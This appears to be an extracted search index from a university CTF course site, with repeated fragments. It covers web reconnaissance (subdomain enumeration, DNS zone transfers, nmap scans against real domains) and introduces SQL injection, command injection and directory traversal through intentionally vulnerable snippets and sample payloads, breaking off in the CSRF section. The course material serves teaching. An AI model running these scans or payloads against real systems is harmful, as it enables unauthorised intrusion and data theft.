this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively! recon-ng In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section. recon-ng use use recon/domains-hosts/ # This will give you a vast amount of alternatives. show options set source cnn.com All these subdomains will be saved in hosts , which you can access though: show hosts If some of these subdomains are not given IPs automatically you can just run use recon/hosts-hosts/resolve run And it will resolve all the hosts in the hosts-file. Google Dorks Using google we can also find subdomains. This will only give us the subdomains of a site. site:msn.com -site:www.msn.com site:*.nextcloud.com To exclude a specific subdomain you can do this: site:*.nextcloud.com -site:help.nextcloud.com subbrute.py The basic command is like this ./subbrute.py -p cnn.com https://github.com/TheRook/subbrute Knock I haven't tested this yet. https://github.com/guelfoweb/knock Being smart You also have to look at what kind of system the target has. Some web-apps give their clients their own subdomains. Like github. Check out the homepage Often companies brag about their clients. You can use this to guess the subdomains of some clients. Reverse DNS-lookup If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new. The text-file onlyIps.txt is a textfile with one IP-address on each line. #!/bin/bash while read p; do echo $p; host $p done <onlyIps.txt Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-check-reverse-dns/ Online tools DNSDumpster https://dnsdumpster.com/ Pentest-tools https://pentest-tools.com/information-gathering/find-subdomains-of-domain Intodns http://www.intodns.com/ DNSStuff This tool doesn't enumerate subdomains per se. But it hands of a lot of information about domains. http://www.dnsstuff.com/ Bypassing CloudFlare https://www.ericzhang.me/resolve-cloudflare-ip-leakage/ This tool can be used to find old IPs. It could mean that the http://toolbar.netcraft.com/site_report?url=lyst.com Brute force dictionaries If you try to brute force the domains it is a good idea to have a good dictionary. That can be found here: Bitquark https://github.com/bitquark/dnspop SecList https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS DNS Zone Transfer Attack Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way: To do this we first need to figure out which DNS-servers a domain has. host -t ns wikipedia.com host -l wikipedia.com ns1.wikipedia.com This can also be done with tools such as dnsrecon and dnsenum. https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack Search Engine Discovery Search engines can be very useful for finding information about the target. Search engines can be used for two things: Finding sensitive information on the domain that you are attacking Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc. Remember that the world is bigger than google. So test out the other search engines. Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider Google is a good tool to learn more about a website. Finding specific filetypes filetype:pdf Search within webaddress site:example.com myword Find in url inurl:test.com Wild cards You can use the asterisk to as a wildcard: * Example: \"I've been * for a heart\" This will return answers where * is anything. Exclude words - the dash excludes a specific word This query searches for pages that used the word bananasplit. -banana bananasplit Cached version So if a website has been taken down you can still find the cached version, of the last time google visited the site cache:website.com https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf Examples Find login-pages on sites that use the ending .bo. For bolivia. site:bo inurl:admin.php Active information gathering Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target. Netdiscover This tool is used to scan a network for live machines. netdiscover -r 192.168.1.1/24 Nikto Nikto is a good tool to scan webservers. It is very intrusive. nikto -host 192.168.1.101 Port Scanning TLDR # Stealthy nmap -sS 10.11.1.X # Scan all ports, might take a while. nmap 10.11.1.X -p- # Scan for UDP nmap 10.11.1.X -sU unicornscan -mU -v -I 10.11.1.X # Scan for version, with NSE-scripts and trying to identify OS nmap 10.11.1.X -sV -sC -O # All out monsterscan nmap -vvv -Pn -A -iL listOfIP.txt # Fast scan nmap 10.11.1.X -F # Only scan the 100 most common ports nmap 10.11.1.X --top-ports 100 Nmap Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the -iL flag. Basics - tcp-connect scan Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means: machine1 sends a syn packet to machine2 machine2 send a syn-ack packet to machine1 machine1 sends a ack packet to machine2. If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise. This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates. \"Stealthy\" -sS By adding the -sS flag we are telling nmap to not finalize the three way handshake. It will send a syn , receive syn-ack (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore. In the flag I imagine that the first s stands for scan/scantype and the second S stands for syn . So -sS can be read as scantype syn UDP scan UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable. -sU Output scan to a textfile Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead. # To text-file -oN nameOfFile # To grepable format -oG nameOfFile # To xml -oX nameOfFile Scan an entire IP-range You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range. The -sn flag stops nmap from running port-scans. So it speeds up the process. nmap -vvv -sn 201.210.67.0/24 You can also specify a specific range, like this nmap -sP 201.210.67.0-100 ` Sort out the machines that are up So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s. First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all. cat ip-range.txt | grep -B 1 \"Host is up\" Now let's sort out the ips from that file. grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt > only-ip.txt Now you can input all those ips to nmap and scan them. Scan a range and output if a specific port is open Nmap has a command to make the output grepable. nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open Nmap scripts This chapter could also be placed in Vulnerability-analysis and Exploitation. Because nmap scripting is a really versatile tool that can do many things. Here we will focus on it's ability to retrieve information that can be useful in the process to find vulnerabilities First locate the nmap scripts. Nmap scripts end in .nse . For Nmap script engine. locate *.nse The syntax for running a script is: nmap --script scriptname 192.168.1.101 To find the \"man\"-pages, the info about a script we write: nmap -script-help http-vuln-cve2013-0156.nse Run multiple scripts Can be run by separating the script with a comma nmap --script scriptone.nse,sciprt2.nse,script3.nse 192.168.1.101 Run the default scripts nmap -sC example.com Metasploit We can do port-scanning with metasploit and nmap. And we can even integrate nmap into metasploit. This might be a good way to keep your process neat and organized. db_nmap You can run db_nmap and all the output will be stored in the metasploit database and available with hosts services You can also import nmap scans. But you must first output it in xml-format with the following flag nmap 192.168.1.107 -oX result.xml Good practice would be to output the scan-results in xml, grepable and normal format. You do that with nmap 192.168.1.107 -oA result Then you can load it into the database with the following command. db_import /path/to/file.xml Metasploit PortScan modules If you for some reason don't have access to nmap you can run metasploits modules that does portscans use auxiliary/scanner/portscan/ Stealing Sensitive Information Disclosure from a Web If at some point you find a web page that presents you sensitive information based on your session : Maybe it's reflecting cookies, or printing or CC details or any other sensitive information, you may try to steal it. Here I present you the main ways to can try to achieve it: CORS bypass : If you can bypass CORS headers you will be able to steal the information performing Ajax request for a malicious page. XSS : If you find a XSS vulnerability on the page you may be able to abuse it to steal the information. Danging Markup : If you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags. Clickjaking : If there is no protection against this attack, you may be able to trick the user into sending you the sensitive data (an example here ). Exercise This week we won't have CTF grades. But you still can have a try. (0 pt) Kitten War: Behind the Domain Each year, those dragon-li cats would have a war with orange cats. From dining hall to library, from Lychee Hill to TB2. All day to night they fought together to claim manor. However, this year things are different. Since the COVID-19 becomes serious and dangerous, which can also infect cats. Kitten war would be hold online. Now, dragon-li cats just borrowed ours domain name to establish their website. Once the website is finished, they would hire too many cats that orange cats can't fight. One day, when you step into TB2, an orange cat stopped you and begged, \"humble human, please help us! We are losing the war.\" \"Find out what are those dragon-li cats hiding. If you can retrieve the flag behind the domain, I would allow you to pat my belly - for 2 seconds!\" Kittens are so lovely, you can't resist and start to discover DNS records... compass.college Hint1: cats like TXT because TXT looks so cute! Hint2: cats only know a few words listed in the file below. wordlist.txt (0 pt) Kitten War: 5 Cats in a Row Two dragon-li cats are staring at you for a while, since the last cyber attack. After you step into the classroom in TB1, a dragon-li cat jumped on the desk and starts talking to you. \"Orange cats are greedy. Team with us dragon-li cats.\" That cat licks its claw, said, \"TB1 is ours manor, if you team with us, you can always pat cats in TB1.\" \"Now, here's your mission. Orange cats are using a website built by a CTFer from COMPASS. That guy is a noob and the website must be full of vulnerabilities. Check the sensitive files on the website and find us some flag.\" \"If we make orange cats have the website. They would be allowed to purchase dangerous weapons from online market. Then we won't defeat them in video games!\" Without a hesitate, you start to hack the website: Very cheap and nice weapons for orange cats :P) (BONUS 0 pt) Kitten War: Black means Blind The war has lasted for 2 months. The dragon-li cats are settling in TB1 and dining hall, while the orange cats are claimed Lychee Hill and TB2. A black cat was so struggle with these fights. The cat, said, \"we, we are cats. We slept 20 hours a day. Why do we bother fighting instead of sleeping?\" \"Now you have a choice to stop the war,\" the black cat said, \"everyone are looking at obvious things, but nobody cares about blind night.\" \"Log in COMPASS admin panel and use the final flag to stop the meaningless war.\" COMPASS Admin Note app.py","title":"Week4 WEB: Information Discovery"},{"location":"CS315/Week%204/#week4-web-information-discovery","text":"","title":"Week4 WEB: Information Discovery"},{"location":"CS315/Week%204/#information-discovery","text":"So once you have decided on a target you want to start your recon-process. The recon-phase is usually divided up into two phases. Passive information gathering / OSINT This is when you check out stuff like: Web information Email Harvesting Whois enumeration Active information gathering This is when you start scanning the target with your different tools.","title":"Information Discovery"},{"location":"CS315/Week%204/#passive-information-gathering","text":"It is passive in the meaning that it doesn't directly send packets to the service. But in any other sense of the word there is nothing passive about this phase.","title":"Passive information gathering"},{"location":"CS315/Week%204/#visit-the-website","text":"Okay, I guess this actually sends packets to the target, but whatever. Visit the page, look around, read about the target. What do they do?","title":"Visit the website"},{"location":"CS315/Week%204/#whois","text":"Find out who is behind the website. Resolve the DNS host website.com nslookup website.com The the IP address and check it with whois whois 192.168.1.101","title":"Whois"},{"location":"CS315/Week%204/#netcraft","text":"Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare. Another detail that is good to know is the hosting-company or domain-provider . Those details can be used if we want to try some social-engineering or spear-phishing attack . Netcraft","title":"Netcraft"},{"location":"CS315/Week%204/#find-subdomains","text":"Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains","title":"Find Subdomains"},{"location":"CS315/Week%204/#dns-basics","text":"This is the best article I have found about how the DNS-system works. Form the highest to the lowest level. An introduction to dns-terminology components and concepts Before we begin to look at the specific techniques that exists to find subdomains, lets try to understand what subdomains are and how they work. A - records A stands for address . The A record maps a name to one or more IP addresses, when the IP are known and stable. So that would be 123.244.223.222 => example.com AAAA - points to a IPv6 Record CNAME The CNAME record connects a name to another name. An example of that would be: www.example.com,CNAME,www.example.com.cdn.cloudflare.net. Another example is. If you have the domains mail.example.com and webmail.example.com. You can have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same content. Another typical usage of CNAME is to link www.example.com to example.com CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to change the other subdomains, like ftp.example.com or www.example.com. Since they both point to example.com, which is a A-record and points directly to the IP. Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the CNAME (Canonical/real/actual Name) of foo.example.com. Alias Kind of like CNAME in that it points to another name, not an IP. MX - Mail exchange https://en.wikipedia.org/wiki/MX_record","title":"DNS Basics"},{"location":"CS315/Week%204/#find-subdomains_1","text":"Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success. For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively!","title":"Find Subdomains"},{"location":"CS315/Week%204/#recon-ng","text":"In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section. recon-ng use use recon/domains-hosts/ # This will give you a vast amount of alternatives. show options set source cnn.com All these subdomains will be saved in hosts , which you can access though: show hosts If some of these subdomains are not given IPs automatically you can just run use recon/hosts-hosts/resolve run And it will resolve all the hosts in the hosts-file.","title":"recon-ng"},{"location":"CS315/Week%204/#google-dorks","text":"Using google we can also find subdomains. This will only give us the subdomains of a site. site:msn.com -site:www.msn.com site:*.nextcloud.com To exclude a specific subdomain you can do this: site:*.nextcloud.com -site:help.nextcloud.com","title":"Google Dorks"},{"location":"CS315/Week%204/#subbrutepy","text":"The basic command is like this ./subbrute.py -p cnn.com https://github.com/TheRook/subbrute","title":"subbrute.py"},{"location":"CS315/Week%204/#knock","text":"I haven't tested this yet. https://github.com/guelfoweb/knock","title":"Knock"},{"location":"CS315/Week%204/#being-smart","text":"You also have to look at what kind of system the target has. Some web-apps give their clients their own subdomains. Like github. Check out the homepage Often companies brag about their clients. You can use this to guess the subdomains of some clients.","title":"Being smart"},{"location":"CS315/Week%204/#reverse-dns-lookup","text":"If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new. The text-file onlyIps.txt is a textfile with one IP-address on each line. #!/bin/bash while read p; do echo $p; host $p done <onlyIps.txt Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-check-reverse-dns/","title":"Reverse DNS-lookup"},{"location":"CS315/Week%204/#online-tools","text":"","title":"Online tools"},{"location":"CS315/Week%204/#dnsdumpster","text":"https://dnsdumpster.com/","title":"DNSDumpster"},{"location":"CS315/Week%204/#pentest-tools","text":"https://pentest-tools.com/information-gathering/find-subdomains-of-domain","title":"Pentest-tools"},{"location":"CS315/Week%204/#intodns","text":"http://www.intodns.com/","title":"Intodns"},{"location":"CS315/Week%204/#dnsstuff","text":"This tool doesn't enumerate subdomains per se. But it hands of a lot of information about domains. http://www.dnsstuff.com/","title":"DNSStuff"},{"location":"CS315/Week%204/#bypassing-cloudflare","text":"https://www.ericzhang.me/resolve-cloudflare-ip-leakage/ This tool can be used to find old IPs. It could mean that the http://toolbar.netcraft.com/site_report?url=lyst.com","title":"Bypassing CloudFlare"},{"location":"CS315/Week%204/#brute-force-dictionaries","text":"If you try to brute force the domains it is a good idea to have a good dictionary. That can be found here: Bitquark https://github.com/bitquark/dnspop SecList https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS","title":"Brute force dictionaries"},{"location":"CS315/Week%204/#dns-zone-transfer-attack","text":"Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way: To do this we first need to figure out which DNS-servers a domain has. host -t ns wikipedia.com host -l wikipedia.com ns1.wikipedia.com This can also be done with tools such as dnsrecon and dnsenum. https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack","title":"DNS Zone Transfer Attack"},{"location":"CS315/Week%204/#search-engine-discovery","text":"Search engines can be very useful for finding information about the target. Search engines can be used for two things: Finding sensitive information on the domain that you are attacking Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc. Remember that the world is bigger than google. So test out the other search engines. Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider Google is a good tool to learn more about a website.","title":"Search Engine Discovery"},{"location":"CS315/Week%204/#finding-specific-filetypes","text":"filetype:pdf","title":"Finding specific filetypes"},{"location":"CS315/Week%204/#search-within-webaddress","text":"site:example.com myword","title":"Search within webaddress"},{"location":"CS315/Week%204/#find-in-url","text":"inurl:test.com","title":"Find in url"},{"location":"CS315/Week%204/#wild-cards","text":"You can use the asterisk to as a wildcard: * Example: \"I've been * for a heart\" This will return answers where * is anything.","title":"Wild cards"},{"location":"CS315/Week%204/#exclude-words","text":"- the dash excludes a specific word This query searches for pages that used the word bananasplit. -banana bananasplit","title":"Exclude words"},{"location":"CS315/Week%204/#cached-version","text":"So if a website has been taken down you can still find the cached version, of the last time google visited the site cache:website.com https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf","title":"Cached version"},{"location":"CS315/Week%204/#examples","text":"Find login-pages on sites that use the ending .bo. For bolivia. site:bo inurl:admin.php","title":"Examples"},{"location":"CS315/Week%204/#active-information-gathering","text":"Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target.","title":"Active information gathering"},{"location":"CS315/Week%204/#netdiscover","text":"This tool is used to scan a network for live machines. netdiscover -r 192.168.1.1/24","title":"Netdiscover"},{"location":"CS315/Week%204/#nikto","text":"Nikto is a good tool to scan webservers. It is very intrusive. nikto -host 192.168.1.101","title":"Nikto"},{"location":"CS315/Week%204/#port-scanning","text":"","title":"Port Scanning"},{"location":"CS315/Week%204/#tldr","text":"# Stealthy nmap -sS 10.11.1.X # Scan all ports, might take a while. nmap 10.11.1.X -p- # Scan for UDP nmap 10.11.1.X -sU unicornscan -mU -v -I 10.11.1.X # Scan for version, with NSE-scripts and trying to identify OS nmap 10.11.1.X -sV -sC -O # All out monsterscan nmap -vvv -Pn -A -iL listOfIP.txt # Fast scan nmap 10.11.1.X -F # Only scan the 100 most common ports nmap 10.11.1.X --top-ports 100","title":"TLDR"},{"location":"CS315/Week%204/#nmap","text":"Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the -iL flag.","title":"Nmap"},{"location":"CS315/Week%204/#basics-tcp-connect-scan","text":"Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means: machine1 sends a syn packet to machine2 machine2 send a syn-ack packet to machine1 machine1 sends a ack packet to machine2. If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise. This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates.","title":"Basics - tcp-connect scan"},{"location":"CS315/Week%204/#stealthy-ss","text":"By adding the -sS flag we are telling nmap to not finalize the three way handshake. It will send a syn , receive syn-ack (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore. In the flag I imagine that the first s stands for scan/scantype and the second S stands for syn . So -sS can be read as scantype syn","title":"\"Stealthy\" -sS"},{"location":"CS315/Week%204/#udp-scan","text":"UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable. -sU","title":"UDP scan"},{"location":"CS315/Week%204/#output-scan-to-a-textfile","text":"Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead. # To text-file -oN nameOfFile # To grepable format -oG nameOfFile # To xml -oX nameOfFile","title":"Output scan to a textfile"},{"location":"CS315/Week%204/#scan-an-entire-ip-range","text":"You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range. The -sn flag stops nmap from running port-scans. So it speeds up the process. nmap -vvv -sn 201.210.67.0/24 You can also specify a specific range, like this nmap -sP 201.210.67.0-100 `","title":"Scan an entire IP-range"},{"location":"CS315/Week%204/#sort-out-the-machines-that-are-up","text":"So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s. First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all. cat ip-range.txt | grep -B 1 \"Host is up\" Now let's sort out the ips from that file. grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt > only-ip.txt Now you can input all those ips to nmap and scan them.","title":"Sort out the machines that are up"},{"location":"CS315/Week%204/#scan-a-range-and-output-if-a-specific-port-is-open","text":"Nmap has a command to make the output grepable. nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open","title":"Scan a range and output if a specific port is open"},{"location":"CS315/Week%204/#nmap-scripts","text":"This chapter could also be placed in Vulnerability-analysis and Exploitation. Because nmap scripting is a really versatile tool that can do many things. Here we will focus on it's ability to retrieve information that can be useful in the process to find vulnerabilities First locate the nmap scripts. Nmap scripts end in .nse . For Nmap script engine. locate *.nse The syntax for running a script is: nmap --script scriptname 192.168.1.101 To find the \"man\"-pages, the info about a script we write: nmap -script-help http-vuln-cve2013-0156.nse Run multiple scripts Can be run by separating the script with a comma nmap --script scriptone.nse,sciprt2.nse,script3.nse 192.168.1.101 Run the default scripts nmap -sC example.com","title":"Nmap scripts"},{"location":"CS315/Week%204/#metasploit","text":"We can do port-scanning with metasploit and nmap. And we can even integrate nmap into metasploit. This might be a good way to keep your process neat and organized.","title":"Metasploit"},{"location":"CS315/Week%204/#db_nmap","text":"You can run db_nmap and all the output will be stored in the metasploit database and available with hosts services You can also import nmap scans. But you must first output it in xml-format with the following flag nmap 192.168.1.107 -oX result.xml Good practice would be to output the scan-results in xml, grepable and normal format. You do that with nmap 192.168.1.107 -oA result Then you can load it into the database with the following command. db_import /path/to/file.xml","title":"db_nmap"},{"location":"CS315/Week%204/#metasploit-portscan-modules","text":"If you for some reason don't have access to nmap you can run metasploits modules that does portscans use auxiliary/scanner/portscan/","title":"Metasploit PortScan modules"},{"location":"CS315/Week%204/#stealing-sensitive-information-disclosure-from-a-web","text":"If at some point you find a web page that presents you sensitive information based on your session : Maybe it's reflecting cookies, or printing or CC details or any other sensitive information, you may try to steal it. Here I present you the main ways to can try to achieve it: CORS bypass : If you can bypass CORS headers you will be able to steal the information performing Ajax request for a malicious page. XSS : If you find a XSS vulnerability on the page you may be able to abuse it to steal the information. Danging Markup : If you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags. Clickjaking : If there is no protection against this attack, you may be able to trick the user into sending you the sensitive data (an example here ).","title":"Stealing Sensitive Information Disclosure from a Web"},{"location":"CS315/Week%204/#exercise","text":"This week we won't have CTF grades. But you still can have a try.","title":"Exercise"},{"location":"CS315/Week%204/#0-pt-kitten-war-behind-the-domain","text":"Each year, those dragon-li cats would have a war with orange cats. From dining hall to library, from Lychee Hill to TB2. All day to night they fought together to claim manor. However, this year things are different. Since the COVID-19 becomes serious and dangerous, which can also infect cats. Kitten war would be hold online. Now, dragon-li cats just borrowed ours domain name to establish their website. Once the website is finished, they would hire too many cats that orange cats can't fight. One day, when you step into TB2, an orange cat stopped you and begged, \"humble human, please help us! We are losing the war.\" \"Find out what are those dragon-li cats hiding. If you can retrieve the flag behind the domain, I would allow you to pat my belly - for 2 seconds!\" Kittens are so lovely, you can't resist and start to discover DNS records... compass.college Hint1: cats like TXT because TXT looks so cute! Hint2: cats only know a few words listed in the file below. wordlist.txt","title":"(0 pt) Kitten War: Behind the Domain"},{"location":"CS315/Week%204/#0-pt-kitten-war-5-cats-in-a-row","text":"Two dragon-li cats are staring at you for a while, since the last cyber attack. After you step into the classroom in TB1, a dragon-li cat jumped on the desk and starts talking to you. \"Orange cats are greedy. Team with us dragon-li cats.\" That cat licks its claw, said, \"TB1 is ours manor, if you team with us, you can always pat cats in TB1.\" \"Now, here's your mission. Orange cats are using a website built by a CTFer from COMPASS. That guy is a noob and the website must be full of vulnerabilities. Check the sensitive files on the website and find us some flag.\" \"If we make orange cats have the website. They would be allowed to purchase dangerous weapons from online market. Then we won't defeat them in video games!\" Without a hesitate, you start to hack the website: Very cheap and nice weapons for orange cats :P)","title":"(0 pt) Kitten War: 5 Cats in a Row"},{"location":"CS315/Week%204/#bonus-0-pt-kitten-war-black-means-blind","text":"The war has lasted for 2 months. The dragon-li cats are settling in TB1 and dining hall, while the orange cats are claimed Lychee Hill and TB2. A black cat was so struggle with these fights. The cat, said, \"we, we are cats. We slept 20 hours a day. Why do we bother fighting instead of sleeping?\" \"Now you have a choice to stop the war,\" the black cat said, \"everyone are looking at obvious things, but nobody cares about blind night.\" \"Log in COMPASS admin panel and use the final flag to stop the meaningless war.\" COMPASS Admin Note app.py","title":"(BONUS 0 pt) Kitten War: Black means Blind"},{"location":"CS315/Week%205/","text":"Week5 WEB: Vulnerability Exploit Web Exploitation Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming language that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privilege. Common vulnerabilities to see in CTF challenges: SQL Injection Command Injection Directory Traversal Cross Site Request Forgery Cross Site Scripting Server Side Request Forgery SQL Injection SQL Injection is a vulnerability where an application takes input from a user and doesn't validate that the user's input doesn't contain additional SQL. <?php $username = $_GET['username']; // kchung $result = mysql_query(\"SELECT * FROM users WHERE username='$username'\"); ?> If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung). But a malicious user might submit different kind of data. For example, consider if the input was ' ? The application would crash because the resulting SQL query is incorrect. SELECT * FROM users WHERE username=''' Notice the extra single quote at the end. With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection. What if our input was ' OR 1=1 ? SELECT * FROM users WHERE username='' OR 1=1 1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying SELECT * FROM users WHERE username='' OR true This will return every row in the table because each row that exists must be true. We can also inject comments and termination characters like -- or /* or ; . This allows you to terminate SQL queries after your injected statements. For example '-- is a common SQL injection payload. SELECT * FROM users WHERE username=''-- ' This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote. Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return. Command Injection Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the system() command or its equivalent in the programming language of the application. import os domain = user_input() # ctf101.org os.system('ping ' + domain) The above code when used normally will ping the ctf101.org domain. But consider what would happen if the user_input() function returned different data? import os domain = user_input() # ; ls os.system('ping ' + domain) Because of the additional semicolon, the os.system() function is instructed to run two commands. It looks to the program as: ping ; ls The semicolon terminates a command in bash and allows you to put another command after it. Because the ping command is being terminated and the ls command is being added on, the ls command will be run in addition to the empty ping command! This is the core concept behind command injection. The ls command could of course be switched with another command (e.g. wget, curl, bash, etc.) Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection. Example Payloads ;ls $(ls) ls Directory Traversal Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path. Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal. For example, consider an application that allows the user to choose what page to load from a GET parameter. <?php $page = $_GET['page']; // index.php include(\"/var/www/html/\" . $page); ?> Under normal operation the page would be index.php . But what if a malicious user gave in something different? <?php $page = $_GET['page']; // ../../../../../../../../etc/passwd include(\"/var/www/html/\" . $page); ?> Here the user is submitting ../../../../../../../../etc/passwd . This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder. include(\"/var/www/html/../../../../../../../../etc/passwd\"); Ultimately this will become /etc/passwd because the computer will not go a directory above its top directory. Thus the application will load the /etc/passwd file and emit it to the user like so: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities. Cross Site Request Forgery (CSRF) A Cross Site Request Forgery or CSRF Attack, pronounced see surf , is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address. The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an <img> tag or an <iframe> where references to external resources are unverified. Using CSRF GET requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern: http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS] Knowing this format, an attacker can 